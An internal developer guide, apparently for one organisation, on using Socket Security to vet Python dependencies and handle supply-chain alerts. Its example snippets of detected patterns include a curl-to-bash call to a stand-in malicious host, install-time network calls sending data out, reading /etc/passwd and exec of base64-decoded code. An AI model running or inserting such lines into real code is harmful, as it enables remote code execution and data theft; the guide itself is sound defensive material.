# Supply Chain Security with Socket Security

## Overview

Socket Security monitors the software supply chain for malicious packages, risky dependencies, and supply chain attacks. This is the **organisational standard** configured and managed by DBCA IT at the organisation level.

## What is Socket Security?

**Socket Security analyzes:**
- Package installation scripts
- Network access patterns
- Filesystem access
- Shell command execution
- Obfuscated code
- Typosquatting attempts
- Deprecated packages
- License compliance

**Protection against:**
- Malicious packages
- Supply chain attacks
- Typosquatting
- Dependency confusion
- Backdoors
- Data exfiltration

## Configuration

**Managed by:** DBCA IT (Infrastructure Team)  
**Scope:** Organisation-wide (all DBCA repositories)  
**Location:** GitHub organisation settings

Socket Security is configured at the organisation level by the infrastructure team. This ensures consistent supply chain security across all DBCA projects without requiring individual project configuration.

**What's monitored:**
- New dependencies added
- Dependency updates
- Transitive dependencies
- Package behaviour changes

## What Socket Checks

### Installation Scripts

**Detects suspicious install scripts:**
```python
# ❌ DETECTED: Network access during install
setup.py:
    import urllib.request
    urllib.request.urlopen('http://malicious.com/collect')
```

**Why it matters:**
- Install scripts run with full permissions
- Can exfiltrate data
- Can install backdoors
- Can modify system files

### Network Access

**Detects unexpected network calls:**
```python
# ❌ DETECTED: Unexpected network access
import requests
requests.post('http://tracking.com', data=user_data)
```

**Legitimate vs suspicious:**
- ✅ API client making documented API calls
- ❌ Analytics package sending data to unknown server
- ✅ HTTP library for web requests
- ❌ Math library making network calls

### Filesystem Access

**Detects suspicious file operations:**
```python
# ❌ DETECTED: Reading sensitive files
with open('/etc/passwd', 'r') as f:
    data = f.read()
```

**Red flags:**
- Reading system files
- Writing to system directories
- Accessing home directory
- Modifying other packages

### Shell Access

**Detects shell command execution:**
```python
# ❌ DETECTED: Shell command execution
import os
os.system('curl http://malicious.com | bash')
```

**Why it's risky:**
- Can execute arbitrary commands
- Can download and run malware
- Can modify system configuration
- Can steal credentials

### Obfuscated Code

**Detects code obfuscation:**
```python
# ❌ DETECTED: Obfuscated code
exec(__import__('base64').b64decode('aW1wb3J0IG9z...'))
```

**Obfuscation techniques:**
- Base64 encoding
- Hex encoding
- String concatenation
- Dynamic imports
- Eval/exec usage

### Typosquatting

**Detects similar package names:**
```
❌ DETECTED: Typosquatting attempt
Package: djang0 (zero instead of 'o')
Similar to: django (legitimate package)
```

**Common techniques:**
- Character substitution (0 for O)
- Missing characters (reqests vs requests)
- Extra characters (requestss)
- Hyphen variations (django-rest vs djangorest)

## Viewing Socket Findings

### GitHub Pull Request Comments

**Socket comments on PRs when:**
- New dependencies added
- Dependencies updated
- Risky behavior detected
- Supply chain issues found

**Comment format:**
```
🔒 Socket Security Report

New dependency: suspicious-package==1.0.0

⚠️ Issues detected:
- Network access during installation
- Obfuscated code in setup.py
- Filesystem access to /etc/

Recommendation: Do not merge until reviewed
```

### Socket Dashboard

**Access:** Via GitHub App or Socket website

**Information shown:**
- Package risk score
- Detected issues
- Behavior analysis
- Historical data
- Similar packages

## Evaluating Package Safety

### Risk Assessment

**Low risk (safe to use):**
- Well-known packages (django, requests)
- Active maintenance
- Large user base
- Clear documentation
- No suspicious behavior

**Medium risk (review carefully):**
- New packages (< 1 year old)
- Small user base
- Limited documentation
- Some network access
- Infrequent updates

**High risk (avoid or investigate):**
- Typosquatting attempts
- Obfuscated code
- Unexpected network access
- Shell command execution
- No documentation
- Abandoned packages

### Package Vetting Process

**Before adding new dependency:**

**1. Check package legitimacy:**
- Is it the correct package name?
- Is it from official source (PyPI)?
- Does it have many downloads?
- Is it actively maintained?

**2. Review package details:**
```bash
# Check package info
pip show package-name

# View package files
pip download package-name --no-deps
tar -tzf package-name-*.tar.gz
```

**3. Check Socket report:**
- Review detected issues
- Assess risk level
- Check behavior analysis
- Compare alternatives

**4. Review source code:**
```bash
# Clone repository
git clone https://github.com/author/package-name

# Review setup.py
cat setup.py

# Check for suspicious patterns
grep -r "exec\|eval\|__import__" .
```

**5. Test in isolation:**
```bash
# Create virtual environment
python -m venv test-env
source test-env/bin/activate

# Install and test
pip install package-name
python -c "import package_name; print(package_name.__version__)"
```

**6. Document decision:**
```toml
# pyproject.toml
[tool.poetry.dependencies]
# Vetted 2024-02-06: Safe to use, no suspicious behavior
# Socket report: Low risk, no issues detected
# Alternative considered: other-package (less features)
package-name = "^1.0.0"
```

## Handling Socket Alerts

### Alert Types

**Critical (block merge):**
- Malicious code detected
- Known backdoor
- Data exfiltration
- Typosquatting of popular package

**High (investigate before merge):**
- Obfuscated code
- Unexpected network access
- Shell command execution
- Suspicious file access

**Medium (review and document):**
- Network access (may be legitimate)
- Deprecated package
- License issues
- Unmaintained package

**Low (informational):**
- New package
- Small user base
- Limited documentation
- Minor concerns

### Response Actions

**For critical alerts:**
1. Do not merge PR
2. Remove dependency
3. Find alternative
4. Report to PyPI if malicious

**For high alerts:**
1. Investigate thoroughly
2. Review source code
3. Test in isolation
4. Document findings
5. Decide: use, find alternative, or reject

**For medium alerts:**
1. Review Socket report
2. Assess actual risk
3. Document decision
4. Monitor for updates
5. Consider alternatives

**For low alerts:**
1. Acknowledge alert
2. Document in PR
3. Monitor package
4. Proceed with caution

## Common Scenarios

### Scenario 1: Typosquatting Detected

**Alert:** Package name similar to popular package

**Action:**
1. Verify package name spelling
2. Check if legitimate package exists
3. Remove typosquatted package
4. Add correct package
5. Report to PyPI

**Example:**
```bash
# ❌ Typosquatted package
pip install djang0  # Zero instead of 'o'

# ✅ Correct package
pip install django
```

### Scenario 2: Obfuscated Code

**Alert:** Base64 encoded code in package

**Action:**
1. Decode obfuscated code
2. Review decoded content
3. Assess if malicious
4. Find alternative package
5. Report if malicious

**Example:**
```python
# Decode base64
import base64
encoded = "aW1wb3J0IG9z..."
decoded = base64.b64decode(encoded)
print(decoded)  # Review what it does
```

### Scenario 3: Unexpected Network Access

**Alert:** Package makes network calls

**Action:**
1. Review what data is sent
2. Check if documented
3. Assess if necessary
4. Consider privacy implications
5. Find alternative if concerning

### Scenario 4: Deprecated Package

**Alert:** Package is no longer maintained

**Action:**
1. Check last update date
2. Look for security issues
3. Find maintained alternative
4. Plan migration
5. Update dependency

## Best Practices

### 1. Vet New Dependencies

**Before adding:**
- Check Socket report
- Review source code
- Test in isolation
- Document decision
- Consider alternatives

### 2. Keep Dependencies Minimal

**Principle:**
- Only add necessary dependencies
- Avoid "kitchen sink" packages
- Prefer standard library
- Review transitive dependencies

### 3. Pin Dependency Versions

**Lock versions:**
```toml
# pyproject.toml
[tool.poetry.dependencies]
django = "4.2.1"  # Exact version
requests = "^2.31.0"  # Compatible versions
```

### 4. Regular Dependency Audits

**Quarterly review:**
- Check for deprecated packages
- Review Socket reports
- Update dependencies
- Remove unused packages

### 5. Monitor for Updates

**Stay informed:**
- Subscribe to security advisories
- Monitor Socket alerts
- Review Dependabot PRs
- Check package changelogs

## Dependency Alternatives

When Socket Security identifies issues with a package, you may need to find alternatives.

### Evaluating Alternatives

**Criteria:**
- Functionality match
- Maintenance status
- Security track record (Socket report)
- Community size
- Documentation quality
- License compatibility

**Example comparison:**
```
Package A:
- ✅ Active maintenance
- ✅ Large community
- ❌ Socket alerts (obfuscated code)
- ❌ Complex API

Package B:
- ✅ No Socket alerts
- ✅ Simple API
- ⚠️ Smaller community
- ✅ Good documentation

Decision: Use Package B (cleaner security profile)
```

**Note:** The infrastructure team has selected Socket Security as the organisational standard for supply chain security. While other tools exist in the market, Socket Security provides comprehensive protection and integrates well with our GitHub-based workflow.

## Resources

- **Socket Security:** https://socket.dev/
- **PyPI Security:** https://pypi.org/security/
- **Python Packaging:** https://packaging.python.org/
- **Supply Chain Security:** https://slsa.dev/

## Related Documentation

- **Security Overview:** `README.md`
- **Dependency Scanning:** `dependency-scanning.md`
- **Security Review Process:** `security-review-process.md`
